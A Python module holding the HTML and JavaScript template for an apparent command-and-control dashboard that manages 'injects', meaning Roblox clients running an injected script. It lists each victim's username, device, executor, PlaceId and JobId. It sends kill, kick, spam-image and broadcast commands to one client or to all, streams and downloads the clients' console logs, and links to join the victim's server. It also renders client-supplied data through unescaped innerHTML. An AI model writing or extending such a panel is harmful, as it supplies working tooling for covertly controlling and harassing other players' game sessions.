from templates.shared import BG_HTML, RAIN_JS

ADMIN_HTML = '''
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Dashboard</title>{style_placeholder}</head>
<body>
    {sidebar_placeholder}
    <div class="main-content">
        <div id="toast-container"></div>
        <div class="container">
            <div class="title-group">
                <div class="target-icon">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#71717a" stroke-width="2">
                        <circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/>
                    </svg>
                </div>
                <div class="title-text">
                    <h1>Executed</h1>
                    <p>Realtime execute monitor</p>
                </div>
                <div style="margin-left:auto; display:flex; gap:8px; align-items:center;">
                    <button class="btn btn-all" onclick="validateGlobal('commands')">Commands for all</button>
                    <button class="btn btn-all" onclick="validateGlobal('tome')">Message for all</button>
                    <div style="color:var(--accent); font-family:'JetBrains Mono'; font-size:14px; font-weight:600; margin-left:10px;" id="count-display">0 injects</div>
                </div>
            </div>
            <div id="injects-table"></div>
        </div>
        <div class="server-console-container">
            <div class="console-header">
                <div style="font-family:'JetBrains Mono'; font-size:10px; color:var(--accent); opacity:0.8;">[ SERVER_SYSTEM_LOGS ]</div>
                <button class="btn-toggle" onclick="toggleConsole()" id="toggle-btn">HIDE</button>
            </div>
            <div class="server-console" id="server-logs"></div>
        </div>
    </div>
''' + BG_HTML + '''
    <div id="modal-overlay" class="overlay">
        <div class="modal-main">
            <div id="modal-label" style="font-family:'JetBrains Mono'; font-size:11px; color:#52525b;">// MESSAGE</div>
            <textarea id="modal-text" rows="4" placeholder="Enter message..." oninput="this.value = this.value.replace(/:/g, '')"></textarea>
            <div style="display:flex; gap:10px;">
                <button class="btn-send" onclick="sendTome()">SEND MESSAGE</button>
                <button class="btn-abort" onclick="closeTome()">ABORT</button>
            </div>
        </div>
    </div>
    <div id="commands-overlay" class="overlay">
        <div class="modal-main">
            <div id="cmd-label" style="font-family:'JetBrains Mono'; font-size:11px; color:#52525b;">// COMMANDS</div>
            <div class="command-grid" id="cmd-grid">
                <div class="btn-cmd-item" data-cmd="kill">Kill</div>
                <div class="btn-cmd-item" data-cmd="kick">Kick</div>
                <div class="btn-cmd-item" data-cmd="spamimage">SpamImage</div>
                <div class="btn-cmd-item" data-cmd="empty">CKOPO</div>
            </div>
            <div id="kick-reason-box" style="display:none;">
                <div style="font-family:'JetBrains Mono'; font-size:11px; color:#52525b;">// KICK_REASON (max 70 chars & no ":" allowed)</div>
                <input type="text" id="kick-reason-input" placeholder="Enter reason..." maxlength="70" oninput="this.value = this.value.replace(/:/g, '')">
            </div>
            <div style="display:flex; gap:10px;">
                <button class="btn-send" onclick="executeCommand()">EXECUTE</button>
                <button class="btn-abort" onclick="closeCommands()">ABORT</button>
            </div>
        </div>
    </div>
    <div id="console-overlay" class="overlay">
        <div class="modal-main wide">
            <div style="font-family:'JetBrains Mono'; font-size:11px; color:#52525b;">// CONSOLE_MASTER</div>
            <div class="console-stream" id="console-stream"></div>
            <div style="display:flex; gap:10px; align-items:center;">
                <button class="btn btn-download-logs" style="margin-right:auto;" onclick="downloadLogs()">DOWNLOAD .TXT</button>
                <button class="btn-abort" style="flex:0.3" onclick="closeConsole()">CLOSE</button>
            </div>
        </div>
    </div>
''' + RAIN_JS + '''
    <script>
        let currentTarget = null;
        let selectedCmd = null;
        let activeNick = "";
        let clientsCount = 0;

        function showToast(text, type='success') {
            const container = document.getElementById('toast-container');
            if (container.children.length >= 5) container.removeChild(container.firstChild);
            const toast = document.createElement('div');
            toast.className = 'toast-item';
            const iconClass = type === 'success' ? 'toast-success' : 'toast-error';
            const iconChar = type === 'success' ? 'Y' : 'X';
            toast.innerHTML = `<div class="toast-icon ${iconClass}">${iconChar}</div><div style="font-size:14px; color:#fff;">${text}</div>`;
            container.appendChild(toast);
            setTimeout(() => { toast.style.opacity='0'; toast.style.transition='0.3s'; setTimeout(()=>toast.remove(),300); }, 2500);
        }
        function validateGlobal(type) {
            if (clientsCount === 0) { showToast('No clients found', 'error'); return; }
            if (type === 'commands') openCommands('all', 'all'); else openTome('all', 'all');
        }
        function openTome(id, nick) {
            currentTarget = id; activeNick = nick;
            document.getElementById('modal-label').innerText = id === 'all' ? "// BROADCAST: MESSAGE_ALL (no ':' allowed)" : "// MESSAGE -> " + nick;
            document.getElementById('modal-overlay').style.display = 'flex';
        }
        function closeTome() {
            const area = document.getElementById('modal-text');
            area.value = ''; area.style.height = 'auto';
            document.getElementById('modal-overlay').style.display = 'none';
        }
        function openCommands(id, nick) {
            currentTarget = id; activeNick = nick; selectedCmd = null;
            document.getElementById('cmd-label').innerText = id === 'all' ? "// BROADCAST: COMMANDS_ALL" : "// COMMANDS -> " + nick;
            document.querySelectorAll('.btn-cmd-item').forEach(b => b.classList.remove('selected'));
            document.getElementById('kick-reason-box').style.display = 'none';
            document.getElementById('commands-overlay').style.display = 'flex';
        }
        function toggleConsole() {
            const logBox = document.getElementById('server-logs');
            const btn = document.getElementById('toggle-btn');
            if (logBox.classList.contains('hidden')) { logBox.classList.remove('hidden'); btn.innerText = 'HIDE'; }
            else { logBox.classList.add('hidden'); btn.innerText = 'SHOW'; }
        }
        function closeCommands() {
            document.getElementById('commands-overlay').style.display = 'none';
            const kickInput = document.getElementById('kick-reason-input');
            if (kickInput) kickInput.value = '';
            selectedCmd = null;
            document.querySelectorAll('.btn-cmd-item').forEach(b => b.classList.remove('selected'));
        }
        document.getElementById('cmd-grid').addEventListener('click', (e) => {
            const btn = e.target.closest('.btn-cmd-item');
            if (!btn) return;
            document.querySelectorAll('.btn-cmd-item').forEach(b => b.classList.remove('selected'));
            btn.classList.add('selected');
            selectedCmd = btn.getAttribute('data-cmd');
            document.getElementById('kick-reason-box').style.display = (selectedCmd === 'kick') ? 'block' : 'none';
        });
        async function executeCommand() {
            if (!selectedCmd || selectedCmd === 'empty') { showToast('Select command', 'error'); return; }
            let finalMsg = selectedCmd + ":" + activeNick;
            if (selectedCmd === 'kick') {
                const reason = document.getElementById('kick-reason-input').value.trim();
                finalMsg = "kick:" + (reason || "No reason") + ":" + activeNick;
            }
            await fetch(`/api/command?id=${currentTarget}&msg=${encodeURIComponent(finalMsg)}`);
            closeCommands(); showToast('Command sent');
        }
        async function sendTome() {
            const val = document.getElementById('modal-text').value.trim();
            if (!val) { showToast('Enter message', 'error'); return; }
            await fetch(`/api/command?id=${currentTarget}&msg=tome:${encodeURIComponent(val)}:${activeNick}`);
            closeTome(); showToast('Message sent');
        }
        async function openConsole(id, name) {
            currentTarget = id; activeNick = name;
            document.getElementById('console-stream').innerHTML = '';
            document.getElementById('console-overlay').style.display = 'flex';
            await fetch(`/api/command?id=${id}&msg=start_logs`);
        }
        async function closeConsole() {
            if (currentTarget && currentTarget !== 'all') await fetch(`/api/command?id=${currentTarget}&msg=stop_logs`);
            document.getElementById('console-overlay').style.display = 'none';
            currentTarget = null;
        }
        function getDeviceIcon(device) {
            if (device === "PC") return "PC";
            if (device === "Mobile") return "MOBILE";
            return "Unknown";
        }
        function copyToClipboard(text) {
            const ta = document.createElement("textarea");
            ta.value = text; ta.style.position = "fixed"; ta.style.left = "-999999px";
            document.body.appendChild(ta); ta.focus(); ta.select();
            try { document.execCommand('copy'); showToast('Copied!'); } catch { showToast('Unable to copy', 'error'); }
            document.body.removeChild(ta);
        }
        function downloadLogs() {
            const text = document.getElementById('console-stream').innerText;
            const blob = new Blob([text], { type: 'text/plain' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = `logs_${activeNick}.txt`; a.click();
        }
        async function update() {
            try {
                const logRes = await fetch('/api/get_server_logs');
                const logs = await logRes.json();
                const logBox = document.getElementById('server-logs');
                const isAtBottom = logBox.scrollHeight - logBox.clientHeight <= logBox.scrollTop + 1;
                logBox.innerHTML = logs.map(log => {
                    let type = '';
                    if (log.includes('ERROR')) type = 'err';
                    if (log.includes('WARNING')) type = 'warn';
                    return `<div class="log-line-item ${type}">${log}</div>`;
                }).join('');
                if (isAtBottom) logBox.scrollTop = logBox.scrollHeight;

                const res = await fetch('/api/get_clients');
                const data = await res.json();
                const container = document.getElementById('injects-table');
                const entries = Object.entries(data);
                clientsCount = entries.length;
                document.getElementById('count-display').innerText = clientsCount + ' injects';

                if (clientsCount === 0) {
                    container.innerHTML = `
                        <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;padding:100px 20px;margin-top:50px;border:2px dashed rgba(251,189,5,0.2);border-radius:20px;background:rgba(0,0,0,0.3);">
                            <div style="color:#fbbd05;font-family:'JetBrains Mono',monospace;font-size:24px;font-weight:800;text-transform:uppercase;letter-spacing:5px;text-shadow:0 0 20px rgba(251,189,5,0.6);animation:blink-yellow 2s infinite ease-in-out;">
                                > NO INJECTS FOUND _
                            </div>
                            <div style="color:#52525b;font-family:'JetBrains Mono';font-size:11px;margin-top:15px;">WAITING FOR INCOMING CONNECTIONS...</div>
                        </div>
                        <style>@keyframes blink-yellow{0%{opacity:1;transform:scale(1)}50%{opacity:0.6;transform:scale(0.98)}100%{opacity:1;transform:scale(1)}}</style>`;
                    return;
                }

                if (currentTarget && currentTarget !== 'all' && data[currentTarget]) {
                    const stream = document.getElementById('console-stream');
                    (data[currentTarget].new_logs || []).forEach(log => {
                        stream.insertAdjacentHTML('beforeend', `<div class="log-line"><span class="line-text">${log}</span></div>`);
                    });
                    if (data[currentTarget].new_logs.length > 0) fetch(`/api/clear_logs?id=${currentTarget}`);
                }

                container.innerHTML = entries.reverse().map(([id, user]) => `
                    <div class="hit-row">
                        <div class="cell nick">@${user.name}</div>
                        <div class="cell info">
                            <span class="device-icon">${getDeviceIcon(user.device)}</span>
                            <span class="exe-tag">${user.exe}</span>
                            <b>PlaceId:</b> ${user.placeId}
                            <b style="margin-left:15px;">JobId:</b> ${user.jobId.substring(0,8)}...
                            <span class="copy-btn" onclick="copyToClipboard('${user.jobId}')">Copy</span>
                        </div>
                        <div class="actions">
                            <button class="btn" onclick="openConsole('${id}', '${user.name}')">ConsoleLogs</button>
                            <button class="btn" onclick="openCommands('${id}', '${user.name}')">Commands</button>
                            <button class="btn" onclick="openTome('${id}', '${user.name}')">Message</button>
                            <a href="https://www.roblox.com/games/start?placeId=${user.placeId}&gameId=${user.jobId}" target="_blank" class="btn-join">Join</a>
                        </div>
                    </div>
                `).join('');
            } catch(e) {}
        }
        setInterval(update, 1500); update();
    </script>
</body>
</html>
'''
